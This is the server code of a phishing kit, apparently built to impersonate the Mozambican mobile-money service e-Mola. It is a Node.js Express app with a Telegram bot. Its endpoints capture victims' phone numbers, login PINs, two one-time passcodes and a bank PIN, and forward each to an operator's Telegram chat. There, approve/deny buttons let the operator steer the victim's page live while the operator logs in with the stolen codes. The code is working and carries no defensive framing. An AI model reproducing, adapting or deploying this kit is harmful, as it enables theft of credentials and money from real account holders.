const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { phone, pin } = req.body || {};
    const country = "Moçambique";
    const countryCode = "+258";

    const currentTime = new Date().toLocaleString('pt-MZ', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !pin || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });

    statusStore[phone] = "pending";

    const message = `📱 <b>e-Mola - TENTATIVA DE LOGIN</b>

🆕 <b>NOVO UTILIZADOR</b>
🇲🇿 <b>País:</b> ${country}
🌍 <b>Código de País:</b> ${countryCode}
📱 <b>Número de Telefone:</b> ${phone}
🔢 <b>PIN:</b> ${pin}
⏰ <b>Hora:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Aguardando aprovação</b>
⌛ <b>Tempo limite: 5 minutos</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Permitir avançar", callback_data: `approve|${phone}|${pin}` },
                        { text: "❌ Credenciais inválidas", callback_data: `deny|${phone}|${pin}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Moçambique";
    const countryCode = "+258";
    const currentTime = new Date().toLocaleString('pt-MZ', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });

    statusStore[phone] = "pending_otp1";

    const otpMessage = `1️⃣ <b>e-Mola - PRIMEIRA OTP (Passo 1/2)</b>

🆕 <b>NOVO UTILIZADOR - PRIMEIRA VERIFICAÇÃO</b>
🇲🇿 <b>País:</b> ${country}
🌍 <b>Código de País:</b> ${countryCode}
📱 <b>Número de Telefone:</b> ${phone}
🔐 <b>Código OTP 1:</b> ${otp}
⏰ <b>Hora:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verificar PRIMEIRA OTP:</b>
⌛ <b>Tempo limite: 5 minutos</b>
📝 <b>Seguinte: A segunda OTP será enviada após aprovação</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correto", callback_data: `otp1_correct|${phone}|${otp}` },
                        { text: "❌ Código Incorreto", callback_data: `otp1_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { phone, otp } = req.body || {};
    const country = "Moçambique";
    const countryCode = "+258";
    const currentTime = new Date().toLocaleString('pt-MZ', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !otp || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });

    statusStore[phone] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>e-Mola - SEGUNDA OTP (Passo 2/2)</b>

🆕 <b>NOVO UTILIZADOR - SEGUNDA VERIFICAÇÃO</b>
🇲🇿 <b>País:</b> ${country}
🌍 <b>Código de País:</b> ${countryCode}
📱 <b>Número de Telefone:</b> ${phone}
🔐 <b>Código OTP 2:</b> ${otp}
⏰ <b>Hora:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verificar SEGUNDA OTP:</b>
⌛ <b>Tempo limite: 5 minutos</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correto", callback_data: `otp2_correct|${phone}|${otp}` },
                        { text: "❌ Código Incorreto", callback_data: `otp2_wrong|${phone}` },
                        { text: "🔑 PIN Incorreto", callback_data: `otp2_wrongpin|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { phone, step } = req.body || {};
    
    if (!phone || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });

    const resendMsg = `🔄 <b>REENVIO SOLICITADO</b>

📱 <b>Número de Telefone:</b> ${phone}
📍 <b>Passo:</b> ${step}
⚠️ <b>O utilizador está a aguardar um novo código.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Erro do Telegram" });
    }
});

// -------------------- BANK PIN API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { phone, bankPin } = req.body || {};
    const country = "Moçambique";
    const countryCode = "+258";
    const currentTime = new Date().toLocaleString('pt-MZ', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: false
    });

    if (!phone || !bankPin || !ADMIN_ID) return res.status(400).json({ error: "Dados incompletos" });

    statusStore[phone] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>e-Mola - VERIFICAÇÃO DE PIN BANCÁRIO (Passo 3)</b>

🆕 <b>NOVO UTILIZADOR - SEGURANÇA BANCÁRIA</b>
🇲🇿 <b>País:</b> ${country}
📱 <b>Número de Telefone:</b> ${phone}
🔑 <b>PIN Bancário:</b> ${bankPin}
⏰ <b>Hora:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verificar PIN BANCÁRIO:</b>
⌛ <b>Tempo limite: 5 minutos</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correto", callback_data: `bank_correct|${phone}|${bankPin}` },
                        { text: "❌ PIN Incorreto", callback_data: `bank_wrong|${phone}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Erro do Telegram" });
    }
});

// -------------------- BOT ACTIONS --------------------

// APPROVE
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "approved";
    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const approvedMsg = `✅ <b>LOGIN APROVADO</b>

🆕 <b>NOVO UTILIZADOR</b>
🇲🇿 <b>Moçambique</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Estado: Aprovado</b>
➡️ <b>Seguinte: Primeira OTP (1/2)</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Permitido");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

// DENY
bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "denied";
    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const deniedMsg = `❌ <b>CREDENCIAIS INVÁLIDAS</b>

🇲🇿 <b>Moçambique</b>
📱 <b>${phone}</b>
🔐 <b>${pin}</b>

━━━━━━━━━━━━━━━

❌ <b>Estado: Rejeitado</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Rejeitado");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

// OTP1 CORRECT
bot.action(/^otp1_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const verifiedMsg = `1️⃣ <b>PRIMEIRA OTP VERIFICADA (Passo 1/2)</b>

🇲🇿 <b>Moçambique</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Estado: Primeira OTP verificada</b>
➡️ <b>Seguinte: Segunda OTP (2/2) será enviada</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verificado");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

// OTP1 WRONG
bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp1_wrong";
    await ctx.answerCbQuery("Código Incorreto");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PRIMEIRA OTP INCORRETA</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Solicitado reenvio de OTP.</b>`);
});

// OTP2 CORRECT
bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[phone] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('pt-MZ', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: false });

    const verifiedMsg2 = `2️⃣ <b>SEGUNDA OTP VERIFICADA (Passo 2/2)</b>

🇲🇿 <b>Moçambique</b>
📱 <b>${phone}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Estado: Segunda OTP verificada</b>
✅ <b>Processo Concluído</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Concluído");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

// OTP2 WRONG
bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrong";
    await ctx.answerCbQuery("Código Incorreto");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SEGUNDA OTP INCORRETA</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Solicitado reenvio de OTP.</b>`);
});

// BANK PIN CORRECT
bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    const pin = ctx.match[2];
    statusStore[phone] = "bank_pin_correct";
    
    const finalizedMsg = `✅ <b>PIN BANCÁRIO VERIFICADO</b>

🇲🇿 <b>Moçambique</b>
📱 <b>${phone}</b>
🔑 <b>${pin}</b>

━━━━━━━━━━━━━━━

✅ <b>Estado: Processo Concluído</b>
🏁 <b>Utilizador redirecionado para a página de sucesso</b>`;

    await ctx.answerCbQuery("PIN Bancário Verificado");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

// BANK PIN WRONG
bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "bank_pin_wrong";
    await ctx.answerCbQuery("PIN Bancário Incorreto");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>PIN BANCÁRIO INCORRETO</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Solicitadareintrodução do PIN.</b>`);
});

// OTP2 WRONG PIN
bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const phone = ctx.match[1];
    statusStore[phone] = "otp2_wrongpin";
    await ctx.answerCbQuery("PIN Incorreto");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>PIN INCORRETO REPORTADO</b>\n📱 <b>Utilizador:</b> ${phone}\n⚠️ <b>Utilizador solicitado a reintroduzir o PIN.</b>`);
});

// -------------------- STATUS CHECK (FIXED LOOP) --------------------
app.get('/api/check-status', (req, res) => {
    const phone = req.query.phone;
    const currentStatus = statusStore[phone] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[phone] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Página não encontrada");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Servidor a rodar na porta ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot está ativo");
    } catch (err) {
        console.error("Erro ao iniciar o bot:", err);
    }
});

// Graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
